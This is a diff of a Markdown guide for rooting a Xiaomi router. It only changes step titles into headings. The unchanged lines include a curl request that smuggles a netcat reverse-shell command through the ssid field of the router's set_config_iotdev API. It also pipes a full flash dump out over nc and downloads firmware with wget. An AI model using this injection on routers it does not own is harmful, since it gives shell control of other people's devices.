@@ -25,7 +25,7 @@ Replace <YOUR_STOK> and <YOUR_IP> with your actual data and run this command in 
 ```shell
 curl "http://192.168.31.1/cgi-bin/luci/;stok=<YOUR_STOK>/api/misystem/set_config_iotdev?bssid=12:34:56:78:90:AB&user_id=1234&ssid=%0Amknod%20/tmp/p%20p%3Bnc%20<YOUR_IP>%204445%200%3C/tmp/p%7C/bin/sh%201%3E/tmp/p%202%3E/tmp/p%0A"
 ```
-2. MANDATORY: Creating a Memory Dump
+## 2. MANDATORY: Creating a Memory Dump
 
 Before flashing any custom firmware, you must create a full backup. If you accidentally flash a corrupted bootloader, the router will be "bricked" and can only be recovered using a hardware programmer and this dump.
 
@@ -52,7 +52,7 @@ dd if=/dev/mtdblock0 | nc <YOUR_IP> 5555
 ```
 Note: Using mtdblock0 ensures you have a complete copy of the entire flash memory.
 
-3. Transferring Files to the Router
+## 3. Transferring Files to the Router
 
 To upload custom firmware or a bootloader (like Breed) to the router:
 
@@ -63,7 +63,7 @@ On the Router: Download the file to the RAM:
 cd /tmp
 wget http://<YOUR_IP>:8000/filename.bin
 ```
-4. Recovery (Debrick) via TFTP on Linux
+## 4. Recovery (Debrick) via TFTP on Linux
 
 If the router is bricked (system won't boot) but the bootloader (U-Boot) is still intact, use dnsmasq.
 
